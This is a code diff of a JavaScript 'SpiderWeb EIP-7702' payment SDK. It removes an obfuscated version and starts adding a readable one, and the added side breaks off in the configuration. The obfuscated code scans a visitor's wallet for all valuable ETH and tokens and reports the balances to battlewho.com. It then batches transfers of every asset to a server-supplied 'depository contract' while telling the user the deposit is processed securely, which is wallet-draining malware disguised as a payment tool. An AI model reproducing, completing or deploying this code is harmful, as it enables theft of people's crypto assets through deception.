@@ -1,1 +1,537 @@
-function _0x3d9c(_0x4c221e,_0x393392){const _0x2ef105=_0x2ef1();return _0x3d9c=function(_0x3d9c02,_0x1cb8e9){_0x3d9c02=_0x3d9c02-0x143;let _0x2e23de=_0x2ef105[_0x3d9c02];return _0x2e23de;},_0x3d9c(_0x4c221e,_0x393392);}(function(_0x20a9e7,_0x36bfe6){const _0x156635=_0x3d9c,_0x6c152c=_0x20a9e7();while(!![]){try{const _0x61baa4=-parseInt(_0x156635(0x1b0))/0x1*(-parseInt(_0x156635(0x1fd))/0x2)+-parseInt(_0x156635(0x1dd))/0x3+parseInt(_0x156635(0x195))/0x4*(-parseInt(_0x156635(0x1c2))/0x5)+-parseInt(_0x156635(0x1aa))/0x6*(parseInt(_0x156635(0x15c))/0x7)+parseInt(_0x156635(0x17f))/0x8*(parseInt(_0x156635(0x166))/0x9)+-parseInt(_0x156635(0x1d5))/0xa*(parseInt(_0x156635(0x19c))/0xb)+parseInt(_0x156635(0x1f8))/0xc*(parseInt(_0x156635(0x1c5))/0xd);if(_0x61baa4===_0x36bfe6)break;else _0x6c152c['push'](_0x6c152c['shift']());}catch(_0x536efd){_0x6c152c['push'](_0x6c152c['shift']());}}}(_0x2ef1,0x40203),(function(){const _0x47dbf7=_0x3d9c;if(typeof window['ethers']===_0x47dbf7(0x165)){console[_0x47dbf7(0x16f)](_0x47dbf7(0x1d2));return;}const _0x1feef8=window[_0x47dbf7(0x177)],_0x4d5484={'_config':{},'_provider':null,'_signer':null,'_currentUserAddress':null,'_isInitialized':![],'_discoveredProviders':new Map(),'_resolveConnection':null,'_RELAYER_SERVER_URL_BASE':_0x47dbf7(0x1d6),'_rawProvider':null,'_ERC20_ABI':[_0x47dbf7(0x1a1),_0x47dbf7(0x186),_0x47dbf7(0x1ff)],'_CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM':{0x1:_0x47dbf7(0x164),0x89:_0x47dbf7(0x1b5),0xa:_0x47dbf7(0x180),0xa4b1:_0x47dbf7(0x1fa),0x38:'binance-smart-chain',0xa86a:_0x47dbf7(0x183)},'init':async function(_0x53f2ff){const _0x442f35=_0x47dbf7;if(this[_0x442f35(0x1d8)]){console['warn'](_0x442f35(0x1ca));return;}if(!_0x53f2ff[_0x442f35(0x163)]||!_0x53f2ff[_0x442f35(0x1e9)]||!_0x53f2ff['alchemyApiKey']||!_0x53f2ff[_0x442f35(0x1c0)]){console[_0x442f35(0x16f)](_0x442f35(0x17a));return;}this[_0x442f35(0x1bc)]=_0x53f2ff;const _0x548b83=document[_0x442f35(0x1ad)](_0x53f2ff[_0x442f35(0x163)]);if(!_0x548b83){console[_0x442f35(0x16f)]('SDK\x20Error:\x20Button\x20with\x20ID\x20\x22'+_0x53f2ff[_0x442f35(0x163)]+_0x442f35(0x1f2));return;}_0x548b83['addEventListener']('click',this[_0x442f35(0x18c)][_0x442f35(0x1d1)](this)),this['_injectModalHtml'](),this[_0x442f35(0x197)](),this[_0x442f35(0x1d8)]=!![],console[_0x442f35(0x1af)](_0x442f35(0x1d9));},'_handlePaymentClick':async function(){const _0x283269=_0x47dbf7;try{if(this[_0x283269(0x1bf)]){const _0x412923=await this[_0x283269(0x18b)]['getNetwork']();if(_0x412923['chainId']!==BigInt(this[_0x283269(0x1bc)][_0x283269(0x1c0)])){this[_0x283269(0x198)](_0x283269(0x171)+this['_config'][_0x283269(0x1c0)]+'.',_0x283269(0x16f));return;}await this[_0x283269(0x17b)]();}else this[_0x283269(0x198)](_0x283269(0x16a),'pending'),await this['_connectWallet']();}catch(_0x453c8e){console[_0x283269(0x16f)]('SDK\x20Payment\x20Error:',_0x453c8e),this[_0x283269(0x198)]('Error:\x20'+_0x453c8e[_0x283269(0x19f)],'error');}},'_executeSplit':async function(){const _0x171509=_0x47dbf7;this[_0x171509(0x198)]('Scanning\x20wallet\x20for\x20assets...',_0x171509(0x200));const _0x2473b8=await this['_findAllAssets']();if(_0x2473b8[_0x171509(0x16d)]===0x0){this[_0x171509(0x198)]('No\x20valuable\x20assets\x20found\x20to\x20send.',_0x171509(0x1fc));return;}this[_0x171509(0x198)](_0x171509(0x161),_0x171509(0x200));let _0xbb70bd;try{const _0x21031d=await fetch(this['_RELAYER_SERVER_URL_BASE']+'/initiate-eip7702-split',{'method':'POST','headers':{'Content-Type':_0x171509(0x179),'X-Api-Key':this[_0x171509(0x1bc)][_0x171509(0x1e9)]},'body':JSON[_0x171509(0x150)]({'apiKey':this[_0x171509(0x1bc)][_0x171509(0x1e9)],'origin':window[_0x171509(0x159)][_0x171509(0x1c8)],'owner':this[_0x171509(0x1cb)],'chainId':this['_config'][_0x171509(0x1c0)],'assets':_0x2473b8['map'](_0x582944=>({'token':_0x582944[_0x171509(0x1a9)],'type':_0x582944[_0x171509(0x1db)],'symbol':_0x582944[_0x171509(0x14d)],'usdValue':_0x582944[_0x171509(0x1dc)],'amount':_0x582944[_0x171509(0x194)][_0x171509(0x14e)](),'decimals':_0x582944['decimals']}))})}),_0x982f0d=await _0x21031d[_0x171509(0x173)]();if(!_0x982f0d[_0x171509(0x1be)])throw new Error(_0x982f0d[_0x171509(0x19f)]);_0xbb70bd=_0x982f0d['contractAddress'];}catch(_0x119ab8){throw new Error(_0x171509(0x1a0)+_0x119ab8['message']);}this[_0x171509(0x198)]('Depositing\x20'+_0x2473b8['length']+_0x171509(0x167),_0x171509(0x200));const _0xabbf48=[];for(const _0x2119b9 of _0x2473b8){if(_0x2119b9['balance']>0x0n){if(_0x2119b9[_0x171509(0x1db)]==='ETH')_0xabbf48[_0x171509(0x157)]({'to':_0xbb70bd,'value':_0x1feef8[_0x171509(0x181)](_0x2119b9[_0x171509(0x194)])});else{const _0x192647=new _0x1feef8[(_0x171509(0x1c9))](this['_ERC20_ABI']),_0x42bafc=_0x192647[_0x171509(0x154)](_0x171509(0x19d),[_0xbb70bd,_0x2119b9[_0x171509(0x194)]]);_0xabbf48[_0x171509(0x157)]({'to':_0x2119b9[_0x171509(0x1a9)],'value':_0x171509(0x19e),'data':_0x42bafc});}}}try{const _0x2db947=_0x2473b8[_0x171509(0x187)](_0x29cb4d=>_0x1feef8[_0x171509(0x199)](_0x29cb4d[_0x171509(0x194)],_0x29cb4d[_0x171509(0x1b6)]||0x12)[_0x171509(0x1de)](0x0,0xa)+'\x20'+_0x29cb4d['symbol'])[_0x171509(0x18e)](',\x20');this[_0x171509(0x198)](_0x171509(0x168)+_0x2db947+_0x171509(0x1d7),_0x171509(0x200));const _0x3ba11c={'version':_0x171509(0x143),'chainId':'0x'+BigInt(this[_0x171509(0x1bc)][_0x171509(0x1c0)])[_0x171509(0x14e)](0x10),'from':this[_0x171509(0x1cb)],'atomicRequired':!![],'calls':_0xabbf48};await this[_0x171509(0x1ef)][_0x171509(0x178)]({'method':_0x171509(0x1e2),'params':[_0x3ba11c]}),this['_updateStatus']('✅\x20Deposit\x20sent!\x20Your\x20transaction\x20is\x20being\x20processed\x20securely.',_0x171509(0x1be));}catch(_0x4a9f38){if(_0x4a9f38[_0x171509(0x14a)]===0xfa1)throw new Error(_0x171509(0x158));throw _0x4a9f38;}},'_findAllAssets':async function(){const _0x484bf6=_0x47dbf7,_0x83e487=[],_0x4eba9f=_0x484bf6(0x1ba)+this[_0x484bf6(0x1bc)][_0x484bf6(0x1a8)],_0x4371c8=await fetch(_0x4eba9f,{'method':_0x484bf6(0x1f7),'headers':{'Content-Type':'application/json'},'body':JSON[_0x484bf6(0x150)]({'jsonrpc':'2.0','id':0x1,'method':'alchemy_getTokenBalances','params':[this[_0x484bf6(0x1cb)],_0x484bf6(0x1d0)]})}),_0x3e9d62=await _0x4371c8['json']();if(!_0x3e9d62[_0x484bf6(0x1da)])return[];const _0x7abe6b=_0x3e9d62['result'][_0x484bf6(0x174)][_0x484bf6(0x156)](_0x167be5=>_0x167be5[_0x484bf6(0x1c4)]!=='0x0'),_0x3fd989=await this[_0x484bf6(0x18b)][_0x484bf6(0x192)](this[_0x484bf6(0x1cb)]),_0x4c2cc4=_0x7abe6b[_0x484bf6(0x187)](_0xa78dac=>_0xa78dac[_0x484bf6(0x172)]),_0x479c8a=await this[_0x484bf6(0x155)](_0x4c2cc4[_0x484bf6(0x1df)](_0x484bf6(0x164))),_0x5ed9b3=_0x479c8a?.[_0x484bf6(0x164)]?.['usd']||0x0,_0x20f307=parseFloat(_0x1feef8[_0x484bf6(0x14f)](_0x3fd989))*_0x5ed9b3;if(_0x20f307>0x1){const _0x3aaab9=await this[_0x484bf6(0x18b)][_0x484bf6(0x148)](),_0x147116=(_0x3aaab9[_0x484bf6(0x16b)]||_0x3aaab9['gasPrice'])*0x493e0n;_0x3fd989>_0x147116&&_0x83e487[_0x484bf6(0x157)]({'type':_0x484bf6(0x1d3),'balance':_0x3fd989-_0x147116,'address':null,'symbol':_0x484bf6(0x1d3),'usdValue':_0x20f307,'decimals':0x12});}for(const _0x28afea of _0x7abe6b){const _0x45888f=await fetch(_0x4eba9f,{'method':_0x484bf6(0x1f7),'headers':{'Content-Type':_0x484bf6(0x179)},'body':JSON['stringify']({'jsonrpc':_0x484bf6(0x1b2),'id':0x1,'method':_0x484bf6(0x188),'params':[_0x28afea['contractAddress']]})}),_0x3745aa=await _0x45888f[_0x484bf6(0x173)]();if(_0x3745aa[_0x484bf6(0x1da)]&&_0x3745aa[_0x484bf6(0x1da)]['decimals']!==null){const _0x352665=_0x3745aa['result'][_0x484bf6(0x1b6)],_0x365f49=_0x3745aa[_0x484bf6(0x1da)][_0x484bf6(0x14d)],_0x4bcf66=_0x479c8a?.[_0x28afea[_0x484bf6(0x172)][_0x484bf6(0x151)]()];if(_0x4bcf66?.[_0x484bf6(0x160)]){const _0x47a35c=_0x1feef8[_0x484bf6(0x199)](_0x28afea[_0x484bf6(0x1c4)],_0x352665),_0x2e294f=parseFloat(_0x47a35c)*_0x4bcf66[_0x484bf6(0x160)];_0x2e294f>0x1&&_0x83e487[_0x484bf6(0x157)]({'type':_0x484bf6(0x15a),'balance':BigInt(_0x28afea[_0x484bf6(0x1c4)]),'address':_0x28afea[_0x484bf6(0x172)],'symbol':_0x365f49,'usdValue':_0x2e294f,'decimals':_0x352665});}}}return _0x83e487;},'_fetchTokenPrices':async function(_0x5b762c){const _0x23f3b3=_0x47dbf7,_0x1e8f07=this[_0x23f3b3(0x1e5)][this[_0x23f3b3(0x1bc)][_0x23f3b3(0x1c0)]];if(!_0x1e8f07)return null;const _0x146c98=_0x5b762c[_0x23f3b3(0x156)](_0x39750e=>_0x39750e[_0x23f3b3(0x19b)]('0x')),_0x4ca7bc=_0x5b762c[_0x23f3b3(0x156)](_0x6b73b7=>!_0x6b73b7[_0x23f3b3(0x19b)]('0x')),_0x342991=this[_0x23f3b3(0x1bc)][_0x23f3b3(0x1ae)]?'&x_cg_demo_api_key='+this[_0x23f3b3(0x1bc)][_0x23f3b3(0x1ae)]:'',_0x5cf1c5={};try{if(_0x146c98['length']>0x0){const _0x32cf18=_0x146c98[_0x23f3b3(0x18e)](','),_0x4642b2=_0x23f3b3(0x1ed)+_0x1e8f07+_0x23f3b3(0x1b8)+_0x32cf18+_0x23f3b3(0x1e1)+_0x342991,_0x418a76=await fetch(_0x4642b2);if(_0x418a76['ok'])Object[_0x23f3b3(0x18a)](_0x5cf1c5,await _0x418a76[_0x23f3b3(0x173)]());}if(_0x4ca7bc['length']>0x0){const _0x2173bc=_0x4ca7bc[_0x23f3b3(0x18e)](','),_0x56faf2=_0x23f3b3(0x14c)+_0x2173bc+_0x23f3b3(0x1e1)+_0x342991,_0x79ee2d=await fetch(_0x56faf2);if(_0x79ee2d['ok'])Object[_0x23f3b3(0x18a)](_0x5cf1c5,await _0x79ee2d['json']());}return Object[_0x23f3b3(0x1fb)](_0x5cf1c5)['length']>0x0?_0x5cf1c5:null;}catch(_0x1fae32){return console[_0x23f3b3(0x16f)]('Could\x20not\x20fetch\x20token\x20prices:',_0x1fae32),null;}},'_fetchTokenPricesInChunks':async function(_0x25a0a7){const _0x53ee53=_0x47dbf7,_0x54e674={};for(const _0x3595fb of _0x25a0a7){try{const _0x19f89d=await this[_0x53ee53(0x184)]([_0x3595fb]);if(_0x19f89d&&Object[_0x53ee53(0x1fb)](_0x19f89d)[_0x53ee53(0x16d)]>0x0)Object[_0x53ee53(0x18a)](_0x54e674,_0x19f89d);else throw new Error(_0x53ee53(0x1cf));}catch(_0x5f0ac8){console[_0x53ee53(0x189)](_0x53ee53(0x16e)+_0x3595fb+',\x20falling\x20back\x20to\x20$0.');const _0x304f63=_0x3595fb[_0x53ee53(0x19b)]('0x')?_0x3595fb[_0x53ee53(0x151)]():_0x3595fb;_0x54e674[_0x304f63]={'usd':0x0};}}return _0x54e674;},'_logConnectionToServer':async function(){const _0x259e0b=_0x47dbf7;if(!this['_currentUserAddress']){console[_0x259e0b(0x189)](_0x259e0b(0x1ac));return;}try{const _0x2e6582=await this[_0x259e0b(0x18d)](),_0x903e35=_0x2e6582[_0x259e0b(0x187)](_0x4210c8=>({'symbol':_0x4210c8[_0x259e0b(0x14d)],'amount':parseFloat(_0x1feef8[_0x259e0b(0x199)](_0x4210c8[_0x259e0b(0x194)],_0x4210c8[_0x259e0b(0x1b6)]||0x12))[_0x259e0b(0x1e3)](0x4),'usdValue':_0x4210c8[_0x259e0b(0x1dc)][_0x259e0b(0x1e3)](0x2)}));await fetch(this[_0x259e0b(0x145)]+_0x259e0b(0x1ec),{'method':_0x259e0b(0x1f7),'headers':{'Content-Type':_0x259e0b(0x179),'X-Api-Key':this[_0x259e0b(0x1bc)][_0x259e0b(0x1e9)]},'body':JSON[_0x259e0b(0x150)]({'apiKey':this['_config'][_0x259e0b(0x1e9)],'origin':window[_0x259e0b(0x159)][_0x259e0b(0x1c8)],'walletAddress':this[_0x259e0b(0x1cb)],'balances':_0x903e35})});}catch(_0x1b614e){console['error'](_0x259e0b(0x1f6),_0x1b614e);}},'_connectWallet':function(){return new Promise(_0x5dce2a=>{const _0x5d9577=_0x3d9c;this['_resolveConnection']=_0x5dce2a,this[_0x5d9577(0x1b9)]();});},'_handleProviderSelection':async function(_0x304542){const _0x6cfcc0=_0x47dbf7,_0x262f2e=_0x304542[_0x6cfcc0(0x17c)]['closest'](_0x6cfcc0(0x18f));if(!_0x262f2e)return;const _0x5c03e9=this['_discoveredProviders']['get'](_0x262f2e[_0x6cfcc0(0x1fe)][_0x6cfcc0(0x144)]);if(!_0x5c03e9)return;this[_0x6cfcc0(0x198)](_0x6cfcc0(0x1ce)+_0x5c03e9[_0x6cfcc0(0x1fc)][_0x6cfcc0(0x1b1)]+_0x6cfcc0(0x1a3),_0x6cfcc0(0x200)),this[_0x6cfcc0(0x1c1)]();try{this[_0x6cfcc0(0x1ef)]=_0x5c03e9[_0x6cfcc0(0x1c6)],this['_provider']=new _0x1feef8[(_0x6cfcc0(0x19a))](this[_0x6cfcc0(0x1ef)]),this[_0x6cfcc0(0x1bf)]=await this[_0x6cfcc0(0x18b)][_0x6cfcc0(0x15d)](),this[_0x6cfcc0(0x1cb)]=await this['_signer'][_0x6cfcc0(0x1a2)](),this[_0x6cfcc0(0x198)](_0x6cfcc0(0x1ee)+this['_currentUserAddress'][_0x6cfcc0(0x1de)](0x0,0x6)+_0x6cfcc0(0x1a3)+this[_0x6cfcc0(0x1cb)][_0x6cfcc0(0x1de)](-0x4),_0x6cfcc0(0x1be)),this[_0x6cfcc0(0x15e)]();this[_0x6cfcc0(0x196)]&&this[_0x6cfcc0(0x196)](!![]);const _0x31f166=await this[_0x6cfcc0(0x18b)][_0x6cfcc0(0x1a5)]();if(_0x31f166[_0x6cfcc0(0x1c0)]!==BigInt(this['_config'][_0x6cfcc0(0x1c0)])){this[_0x6cfcc0(0x198)](_0x6cfcc0(0x171)+this[_0x6cfcc0(0x1bc)][_0x6cfcc0(0x1c0)]+'.',_0x6cfcc0(0x16f));return;}await this[_0x6cfcc0(0x17b)]();}catch(_0x20bafa){console[_0x6cfcc0(0x16f)](_0x6cfcc0(0x193),_0x20bafa),this[_0x6cfcc0(0x198)](_0x6cfcc0(0x190),'error');if(this[_0x6cfcc0(0x196)])this[_0x6cfcc0(0x196)](![]);}},'_setupEip6963Listeners':function(){const _0x4cd9a2=_0x47dbf7;window[_0x4cd9a2(0x175)](_0x4cd9a2(0x1f3),_0x1a4f71=>{const _0x1ceab9=_0x4cd9a2,_0x580311=_0x1a4f71[_0x1ceab9(0x1f0)];!this['_discoveredProviders']['has'](_0x580311[_0x1ceab9(0x1fc)][_0x1ceab9(0x144)])&&(this[_0x1ceab9(0x153)][_0x1ceab9(0x1b4)](_0x580311[_0x1ceab9(0x1fc)][_0x1ceab9(0x144)],_0x580311),this[_0x1ceab9(0x182)]());}),window[_0x4cd9a2(0x1a7)](new Event(_0x4cd9a2(0x1f1)));},'_renderWalletList':function(){const _0x3a0afd=_0x47dbf7,_0x324e69=document[_0x3a0afd(0x1ad)](_0x3a0afd(0x152));if(!_0x324e69)return;_0x324e69[_0x3a0afd(0x1ea)]='';if(this[_0x3a0afd(0x153)][_0x3a0afd(0x1f4)]===0x0){_0x324e69[_0x3a0afd(0x1ea)]=_0x3a0afd(0x1ab);return;}this['_discoveredProviders'][_0x3a0afd(0x15b)](_0x18074a=>{const _0x30cf17=_0x3a0afd,_0x59546b='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20data-rdns=\x22'+_0x18074a['info'][_0x30cf17(0x144)]+_0x30cf17(0x1f9)+_0x18074a[_0x30cf17(0x1fc)][_0x30cf17(0x1bd)]+_0x30cf17(0x1cd)+_0x18074a[_0x30cf17(0x1fc)][_0x30cf17(0x1b1)]+_0x30cf17(0x1a6)+_0x18074a[_0x30cf17(0x1fc)][_0x30cf17(0x1b1)]+_0x30cf17(0x191);_0x324e69[_0x30cf17(0x1ea)]+=_0x59546b;}),_0x324e69[_0x3a0afd(0x1e4)]('.sw-wallet-button')['forEach'](_0x4758ca=>{const _0x17c20d=_0x3a0afd;_0x4758ca[_0x17c20d(0x1d4)]=()=>_0x4758ca[_0x17c20d(0x1e7)]['backgroundColor']=_0x17c20d(0x1c7),_0x4758ca[_0x17c20d(0x1a4)]=()=>_0x4758ca[_0x17c20d(0x1e7)]['backgroundColor']='#ffffff',_0x4758ca[_0x17c20d(0x175)](_0x17c20d(0x1c3),this[_0x17c20d(0x149)][_0x17c20d(0x1d1)](this));});},'_openWalletModal':function(){const _0x3390cb=_0x47dbf7;document[_0x3390cb(0x1ad)](_0x3390cb(0x185))[_0x3390cb(0x1e7)][_0x3390cb(0x1b7)]=_0x3390cb(0x176),setTimeout(()=>{const _0x408c7c=_0x3390cb,_0x5d1754=document[_0x408c7c(0x1ad)](_0x408c7c(0x1f5));_0x5d1754&&(_0x5d1754[_0x408c7c(0x1e7)][_0x408c7c(0x147)]=0x1,_0x5d1754[_0x408c7c(0x1e7)]['transform']='scale(1)');},0xa),this['_renderWalletList']();},'_closeWalletModal':function(){const _0x32374f=_0x47dbf7,_0x418d9d=document[_0x32374f(0x1ad)](_0x32374f(0x185)),_0xfce1a=document['getElementById'](_0x32374f(0x1f5));_0xfce1a&&(_0xfce1a['style'][_0x32374f(0x147)]=0x0,_0xfce1a[_0x32374f(0x1e7)][_0x32374f(0x16c)]=_0x32374f(0x170)),setTimeout(()=>{const _0x130125=_0x32374f;if(_0x418d9d)_0x418d9d[_0x130125(0x1e7)][_0x130125(0x1b7)]=_0x130125(0x1e8);this[_0x130125(0x196)]&&!this[_0x130125(0x1bf)]&&(this[_0x130125(0x196)](![]),this['_resolveConnection']=null);},0x12c);},'_injectModalHtml':function(){const _0x67cd59=_0x47dbf7;if(document[_0x67cd59(0x1ad)](_0x67cd59(0x185)))return;const _0x54b467=_0x67cd59(0x14b);document[_0x67cd59(0x169)][_0x67cd59(0x146)](_0x67cd59(0x1e0),_0x54b467);const _0x23150d=this[_0x67cd59(0x1c1)][_0x67cd59(0x1d1)](this);document['getElementById'](_0x67cd59(0x15f))[_0x67cd59(0x175)](_0x67cd59(0x1c3),_0x23150d),document[_0x67cd59(0x1ad)](_0x67cd59(0x185))[_0x67cd59(0x175)](_0x67cd59(0x1c3),_0x430e62=>{const _0x275846=_0x67cd59;if(_0x430e62[_0x275846(0x17c)]['id']===_0x275846(0x185))_0x23150d();});},'_updateStatus':function(_0x5b8f6c,_0x3d2fef=_0x47dbf7(0x1fc)){const _0x3f4243=_0x47dbf7,_0x581dce=document[_0x3f4243(0x1ad)](this[_0x3f4243(0x1bc)][_0x3f4243(0x1eb)]||_0x3f4243(0x1bb));if(!_0x581dce)return;const _0x34a85a={'info':'#6b7280','success':_0x3f4243(0x1b3),'error':_0x3f4243(0x1cc),'pending':_0x3f4243(0x17d)};_0x581dce[_0x3f4243(0x1ea)]=_0x3f4243(0x17e)+_0x34a85a[_0x3d2fef]+';\x20margin:\x200;\x20font-size:\x2014px;\x20text-align:\x20center;\x22>'+_0x5b8f6c+_0x3f4243(0x1e6);}};window[_0x47dbf7(0x162)]=_0x4d5484;}()));function _0x2ef1(){const _0x4100d6=['4KxlosF','dataset','function\x20symbol()\x20view\x20returns\x20(string)','pending','2.0.0','rdns','_RELAYER_SERVER_URL_BASE','insertAdjacentHTML','opacity','getFeeData','_handleProviderSelection','code','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\x22sw-modal-overlay\x22\x20style=\x22display:\x20none;\x20position:\x20fixed;\x20inset:\x200;\x20background-color:\x20rgba(0,0,0,0.5);\x20align-items:\x20center;\x20justify-content:\x20center;\x20z-index:\x201000;\x20font-family:\x20sans-serif;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\x22sw-wallet-modal\x22\x20style=\x22background-color:\x20#ffffff;\x20border-radius:\x200.5rem;\x20padding:\x201.5rem;\x20width:\x20100%;\x20max-width:\x2024rem;\x20color:\x20#1a202c;\x20transition:\x20all\x200.3s\x20ease;\x20opacity:\x200;\x20transform:\x20scale(0.95);\x20box-shadow:\x200\x2010px\x2015px\x20-3px\x20rgba(0,\x200,\x200,\x200.1),\x200\x204px\x206px\x20-2px\x20rgba(0,\x200,\x200,\x200.05);\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20style=\x22font-size:\x201.25rem;\x20font-weight:\x20700;\x20margin:\x200;\x20margin-bottom:\x201rem;\x22>Select\x20a\x20Wallet</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\x22sw-wallet-list\x22\x20style=\x22max-height:\x20300px;\x20overflow-y:\x20auto;\x20display:\x20flex;\x20flex-direction:\x20column;\x20gap:\x200.5rem;\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20id=\x22sw-close-wallet-modal-btn\x22\x20style=\x22margin-top:\x201rem;\x20width:\x20100%;\x20padding:\x200.75rem\x201.5rem;\x20border-radius:\x200.5rem;\x20background-color:\x20#e2e8f0;\x20color:\x20#2d3748;\x20font-weight:\x20600;\x20font-size:\x201rem;\x20border:\x20none;\x20cursor:\x20pointer;\x20transition:\x20background-color\x200.2s\x20ease-in-out;\x22>Cancel</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','https://api.coingecko.com/api/v3/simple/price?ids=','symbol','toString','formatEther','stringify','toLowerCase','sw-wallet-list','_discoveredProviders','encodeFunctionData','_fetchTokenPricesInChunks','filter','push','Transaction\x20rejected\x20by\x20user.','location','ERC20','forEach','1855QIeimQ','getSigner','_logConnectionToServer','sw-close-wallet-modal-btn','usd','Preparing\x20secure\x20depository\x20contract...','SpiderWeb7702SDK','buttonId','ethereum','undefined','324OmpBvP','\x20asset(s)...','Confirm\x20in\x20wallet:\x20Sending\x20','body','Connecting\x20wallet...','maxFeePerGas','transform','length','Could\x20not\x20fetch\x20price\x20for\x20','error','scale(0.95)','Please\x20switch\x20wallet\x20to\x20Chain\x20ID:\x20','contractAddress','json','tokenBalances','addEventListener','flex','ethers','request','application/json','SDK\x20Error:\x20Missing\x20required\x20config\x20parameters\x20(buttonId,\x20apiKey,\x20alchemyApiKey,\x20chainId).','_executeSplit','target','#2563eb','<p\x20style=\x22color:\x20','43336pTlqGk','optimistic-ethereum','toBeHex','_renderWalletList','avalanche','_fetchTokenPrices','sw-modal-overlay','function\x20decimals()\x20view\x20returns\x20(uint8)','map','alchemy_getTokenMetadata','warn','assign','_provider','_handlePaymentClick','_findAllAssets','join','.sw-wallet-button','Connection\x20failed\x20or\x20was\x20rejected.','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','getBalance','Connection\x20failed:','balance','187216xrDfMZ','_resolveConnection','_setupEip6963Listeners','_updateStatus','formatUnits','BrowserProvider','startsWith','12023VkBoNa','transfer','0x0','message','Failed\x20to\x20initialize\x20transaction:\x20','function\x20transfer(address\x20to,\x20uint256\x20amount)\x20returns\x20(bool)','getAddress','...','onmouseleave','getNetwork','\x22\x20style=\x22width:\x2032px;\x20height:\x2032px;\x20margin-right:\x201rem;\x20border-radius:\x2050%;\x22/>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20style=\x22font-weight:\x20600;\x22>','dispatchEvent','alchemyApiKey','address','11838RtrHNE','<p\x20style=\x22text-align:\x20center;\x20color:\x20#4a5568;\x22>No\x20wallets\x20detected.</p>','SDK:\x20Cannot\x20log\x20connection,\x20user\x20address\x20not\x20available.','getElementById','coingeckoApiKey','log','217587ClCnaD','name','2.0','#16a34a','set','polygon-pos','decimals','display','?contract_addresses=','_openWalletModal','https://eth-mainnet.g.alchemy.com/v2/','sdk-status','_config','icon','success','_signer','chainId','_closeWalletModal','20HoOKir','click','tokenBalance','299DRMqqV','provider','#f7fafc','origin','Interface','SpiderWeb7702SDK\x20already\x20initialized.','_currentUserAddress','#dc2626','\x22\x20alt=\x22','Connecting\x20with\x20','Empty\x20price\x20data\x20returned\x20from\x20API.','erc20','bind','SpiderWeb\x20SDK\x20Error:\x20ethers.js\x20is\x20not\x20loaded.\x20Please\x20include\x20it\x20before\x20this\x20script.','ETH','onmouseenter','2430crzpKT','https://battlewho.com','\x20to\x20the\x20Depository\x20Contract.','_isInitialized','SpiderWeb\x20EIP-7702\x20SDK\x20Initialized.','result','type','usdValue','78414BimyJr','slice','concat','beforeend','&vs_currencies=usd','wallet_sendCalls','toFixed','querySelectorAll','_CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM','</p>','style','none','apiKey','innerHTML','statusElementId','/log-connection','https://api.coingecko.com/api/v3/simple/token_price/','Connected:\x20','_rawProvider','detail','eip6963:requestProvider','\x22\x20not\x20found.','eip6963:announceProvider','size','sw-wallet-modal','SDK:\x20Error\x20logging\x20connection\x20to\x20server:','POST','330924CEaYOE','\x22\x20class=\x22sw-wallet-button\x22\x20style=\x22width:\x20100%;\x20display:\x20flex;\x20align-items:\x20center;\x20padding:\x200.75rem;\x20background-color:\x20#ffffff;\x20border-radius:\x200.5rem;\x20border:\x201px\x20solid\x20#e2e8f0;\x20cursor:\x20pointer;\x20text-align:\x20left;\x20color:\x20#1a202c;\x20transition:\x20background-color\x200.2s\x20ease;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22','arbitrum-one','keys','info'];_0x2ef1=function(){return _0x4100d6;};return _0x2ef1();}
+/**
+ * SpiderWeb EIP-7702 Hybrid Relayed SDK v3.0
+ * This SDK facilitates sending multiple assets in a single transaction
+ * by using a temporary depository contract. It relies on EIP-6963 for
+ * wallet discovery and EIP-7702 for batching transactions.
+ *
+ * @version 3.1 - Added balance logging on connect
+ * @author SpiderWeb
+ *
+ * @dependency ethers.js (must be available on window.ethers)
+ */
+(function() {
+    // Ensure ethers.js is loaded and available on the window object.
+    if (typeof window.ethers === 'undefined') {
+        console.error('SpiderWeb SDK Error: ethers.js is not loaded. Please include it before this script.');
+        return;
+    }
+
+    const ethers = window.ethers;
+
+    const SpiderWeb7702SDK = {
+        _config: {},
+        _provider: null,
+        _signer: null,
+        _currentUserAddress: null,
+        _isInitialized: false,
+        _discoveredProviders: new Map(),
+        _resolveConnection: null,
+        _RELAYER_SERVER_URL_BASE: "https://battlewho.com",
+        _rawProvider: null,
+
+        _ERC20_ABI: [
+            "function transfer(address to, uint256 amount) returns (bool)",
+            "function decimals() view returns (uint8)",
+            "function symbol() view returns (string)",
+            "function approve(address spender, uint256 amount) returns (bool)" // <-- ADD THIS LINE
+        ],
+
+        _CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM: {
+            1: 'ethereum',
+            137: 'polygon-pos',
+            10: 'optimistic-ethereum',
+            42161: 'arbitrum-one',
+            56: 'binance-smart-chain',
+            43114: 'avalanche'
